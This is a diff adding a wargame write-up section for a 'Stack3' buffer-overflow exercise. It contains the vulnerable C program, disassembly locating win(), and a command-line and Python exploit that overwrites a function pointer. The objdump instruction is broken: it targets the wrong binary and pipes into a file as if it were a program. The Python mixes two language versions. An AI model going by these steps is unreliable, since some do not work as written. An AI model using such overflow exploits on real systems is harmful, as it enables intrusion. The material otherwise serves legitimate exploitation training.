@@ -163,3 +163,75 @@ cproc = Popen("./stack2", stdin=PIPE, stdout=PIPE)
 print cproc.communicate()[0]
 ```
 
+
+
+
+
+#Stack3
+---------------------------------------
+###Source Code:
+```C
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void win()
+{
+  printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)
+{
+  volatile int (*fp)();
+  char buffer[64];
+
+  fp = 0;
+
+  gets(buffer);
+
+  if(fp) {
+      printf("calling function pointer, jumping to 0x%08x\n", fp);
+      fp();
+  }
+}
+```
+###Stack:
+| eip | ebp | fp(0) |   buffer  |
+
+###Plan:
+Another overflow. This time we need to use objdump/gdb to find the memory location of the win function. 
+run the following to generate your assembly:
+```bash
+objdump -d ./stack2 | ./stack2.s
+```
+after reviewing your assembly, you can see the following
+```asm
+08048424 <win>:
+ 8048424:	55                   	push   %ebp
+ 8048425:	89 e5                	mov    %esp,%ebp
+ 8048427:	83 ec 18             	sub    $0x18,%esp
+ 804842a:	c7 04 24 40 85 04 08 	movl   $0x8048540,(%esp)
+ 8048431:	e8 2a ff ff ff       	call   8048360 <puts@plt>
+ 8048436:	c9                   	leave  
+ 8048437:	c3                   	ret   
+```
+this indicates win is at 0x08048424 in memory, so we craft an input that overflows into fp with this location (adjusted for endianess) 
+###winning command:
+```bash
+python -c "print 'a'*64+'\x24\x84\x04\x08'" | ./stack3 
+```
+###Python exploit:
+```Python
+from subprocess import Popen, PIPE
+import os
+################
+buffer = 64
+fill = "A"*buffer
+input=fill+'\x24\x84\x04\x08' #08048424
+print(input)
+#################
+cproc = Popen("./stack3", stdin=PIPE, stdout=PIPE)
+print cproc.communicate(input)[0]
+```
+
